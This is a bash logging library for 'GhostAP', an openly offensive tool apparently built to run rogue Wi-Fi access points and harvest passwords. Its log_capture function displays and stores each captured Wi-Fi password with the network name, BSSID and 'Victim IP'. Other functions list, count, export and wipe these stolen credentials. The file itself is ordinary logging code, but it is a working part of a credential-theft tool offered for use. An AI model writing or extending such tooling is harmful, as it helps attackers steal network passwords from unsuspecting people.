#!/usr/bin/env bash
# ======================================================================
#  GhostAP — Logging Library
#  Developer: ATHEX BLACK HAT
#  Version: 1.0.0
#  Description: Session logging, credential capture, log management
# ======================================================================

# source colors if not already loaded
[[ -z "$RED" ]] && source "${SCRIPT_DIR}/../config/colors.sh" 2>/dev/null
[[ -z "$LOG_DIR" ]] && source "${SCRIPT_DIR}/../config/settings.conf" 2>/dev/null

# ======================================================================
#  LOG LEVELS (numeric for filtering)
# ======================================================================
export LOG_LEVEL_DEBUG=0
export LOG_LEVEL_INFO=1
export LOG_LEVEL_WARN=2
export LOG_LEVEL_ERROR=3
export LOG_LEVEL_SUCCESS=4
export LOG_LEVEL_CAPTURE=5

export CURRENT_LOG_LEVEL="${LOG_LEVEL_DEBUG}"  # log everything by default

# ======================================================================
#  ENSURE LOG DIRECTORY EXISTS
# ======================================================================
_init_logger() {
    local log_dir="${LOG_DIR:-${SCRIPT_DIR}/../logs}"
    mkdir -p "$log_dir" 2>/dev/null
    mkdir -p "${log_dir}/scan_results" 2>/dev/null

    export SESSION_LOG="${SESSION_LOG:-${log_dir}/session.log}"
    export PASSWORD_FILE="${PASSWORD_FILE:-${log_dir}/passwords.txt}"

    touch "$SESSION_LOG" 2>/dev/null
    touch "$PASSWORD_FILE" 2>/dev/null
}

# ======================================================================
#  TIMESTAMP GENERATOR
# ======================================================================
_timestamp() {
    date '+%Y-%m-%d %H:%M:%S'
}

_timestamp_short() {
    date '+%H:%M:%S'
}

# ======================================================================
#  CORE LOGGING FUNCTION
# ======================================================================
_log() {
    local level="$1"
    local message="$2"
    local timestamp
    timestamp=$(_timestamp)

    # write to session log (plaintext)
    echo "[$timestamp] [$level] $message" >> "$SESSION_LOG"
}

# ======================================================================
#  TERMINAL + FILE LOGGING
# ======================================================================

# --- info ---
log_info() {
    local msg="$*"
    echo -e "${CYAN}[$(_timestamp_short)] [*] ${msg}${NC}"
    _log "INFO" "$msg"
}

# --- success ---
log_success() {
    local msg="$*"
    echo -e "${GREEN}[$(_timestamp_short)] [✔] ${msg}${NC}"
    _log "SUCCESS" "$msg"
}

# --- warning ---
log_warn() {
    local msg="$*"
    echo -e "${YELLOW}[$(_timestamp_short)] [!] ${msg}${NC}"
    _log "WARN" "$msg"
}

# --- error ---
log_error() {
    local msg="$*"
    echo -e "${RED}[$(_timestamp_short)] [✘] ${msg}${NC}"
    _log "ERROR" "$msg"
}

# --- debug (only if DEBUG=true) ---
log_debug() {
    if [[ "${DEBUG:-false}" == "true" ]]; then
        local msg="$*"
        echo -e "${GRAY}[$(_timestamp_short)] [~] ${msg}${NC}"
        _log "DEBUG" "$msg"
    fi
}

# --- capture (password harvested) ---
log_capture() {
    local essid="$1"
    local password="$2"
    local bssid="${3:-unknown}"
    local ip="${4:-unknown}"
    local timestamp
    timestamp=$(_timestamp)

    # terminal — big bold
    echo ""
    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}${BOLD}║          🔑 PASSWORD CAPTURED!               ║${NC}"
    echo -e "${GREEN}${BOLD}╠══════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}${BOLD}║${NC}  ESSID     : ${YELLOW}${essid}${GREEN}"
    echo -e "${GREEN}${BOLD}║${NC}  BSSID     : ${GRAY}${bssid}${GREEN}"
    echo -e "${GREEN}${BOLD}║${NC}  Password  : ${WHITE}${BOLD}${password}${NC}"
    echo -e "${GREEN}${BOLD}║${NC}  Victim IP : ${GRAY}${ip}${GREEN}"
    echo -e "${GREEN}${BOLD}║${NC}  Time      : ${GRAY}${timestamp}${GREEN}"
    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════╝${NC}"
    echo ""

    # file — structured
    echo "[$timestamp] ESSID: $essid | BSSID: $bssid | Password: $password | IP: $ip" >> "$PASSWORD_FILE"

    # session log
    _log "CAPTURE" "ESSID=$essid BSSID=$bssid Password=$password IP=$ip"
}

# ======================================================================
#  SESSION HEADER / FOOTER
# ======================================================================
log_session_start() {
    _init_logger
    echo "" >> "$SESSION_LOG"
    echo "════════════════════════════════════════════════" >> "$SESSION_LOG"
    echo "  GhostAP Session Started" >> "$SESSION_LOG"
    echo "  Version : ${TOOL_VERSION:-1.0.0}" >> "$SESSION_LOG"
    echo "  Time    : $(_timestamp)" >> "$SESSION_LOG"
    echo "  User    : $(whoami)" >> "$SESSION_LOG"
    echo "  Host    : $(hostname)" >> "$SESSION_LOG"
    echo "════════════════════════════════════════════════" >> "$SESSION_LOG"
    echo "" >> "$SESSION_LOG"
}

log_session_end() {
    echo "" >> "$SESSION_LOG"
    echo "════════════════════════════════════════════════" >> "$SESSION_LOG"
    echo "  Session Ended: $(_timestamp)" >> "$SESSION_LOG"
    echo "════════════════════════════════════════════════" >> "$SESSION_LOG"
    echo "" >> "$SESSION_LOG"
}

# ======================================================================
#  LOG ROTATION
# ======================================================================
rotate_logs() {
    local max_size_mb=10
    local log_file="$SESSION_LOG"

    if [[ -f "$log_file" ]]; then
        local size_mb
        size_mb=$(du -m "$log_file" 2>/dev/null | cut -f1)

        if [[ "$size_mb" -gt "$max_size_mb" ]]; then
            local backup_name
            backup_name="${log_file}.$(date '+%Y%m%d_%H%M%S').bak"
            mv "$log_file" "$backup_name"
            touch "$log_file"
            log_info "Log rotated: ${backup_name}"
        fi
    fi
}

# ======================================================================
#  VIEW LOGS
# ======================================================================
view_session_log() {
    if [[ -f "$SESSION_LOG" ]]; then
        echo -e "${CYAN}═══ Session Log: ${SESSION_LOG} ═══${NC}"
        echo ""
        cat "$SESSION_LOG" | tail -n 50
        echo ""
        echo -e "${GRAY}(last 50 lines shown)${NC}"
    else
        log_warn "No session log found."
    fi
}

view_passwords() {
    if [[ -f "$PASSWORD_FILE" ]] && [[ -s "$PASSWORD_FILE" ]]; then
        echo -e "${CYAN}═══ Captured Passwords: ${PASSWORD_FILE} ═══${NC}"
        echo ""
        local count=0
        while IFS= read -r line; do
            count=$((count + 1))
            echo -e "  ${GREEN}[${count}]${NC} ${line}"
        done < "$PASSWORD_FILE"
        echo ""
        echo -e "${GRAY}Total: ${count} credential(s) captured${NC}"
    else
        echo -e "${YELLOW}  No passwords captured yet.${NC}"
    fi
}

# ======================================================================
#  EXPORT LOGS
# ======================================================================
export_logs() {
    local export_dir="${1:-${HOME}/ghostap_export_$(date '+%Y%m%d_%H%M%S')}"
    mkdir -p "$export_dir"

    if [[ -f "$SESSION_LOG" ]]; then
        cp "$SESSION_LOG" "$export_dir/"
    fi

    if [[ -f "$PASSWORD_FILE" ]]; then
        cp "$PASSWORD_FILE" "$export_dir/"
    fi

    # compress
    tar -czf "${export_dir}.tar.gz" -C "$(dirname "$export_dir")" "$(basename "$export_dir")" 2>/dev/null
    rm -rf "$export_dir"

    if [[ -f "${export_dir}.tar.gz" ]]; then
        log_success "Logs exported to: ${export_dir}.tar.gz"
    else
        log_error "Export failed."
    fi
}

# ======================================================================
#  CLEAR LOGS
# ======================================================================
clear_logs() {
    read -p "$(echo -e "${RED}[?] Clear all logs? This cannot be undone. (y/n): ${NC}")" CONFIRM
    if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then
        > "$SESSION_LOG"
        > "$PASSWORD_FILE"
        rm -rf "${LOG_DIR}/scan_results/"*
        log_success "All logs cleared."
    else
        log_info "Clear cancelled."
    fi
}

# ======================================================================
#  INITIALIZE ON SOURCE
# ======================================================================
_init_logger

# ======================================================================
#  END OF LOGGER LIBRARY
# ======================================================================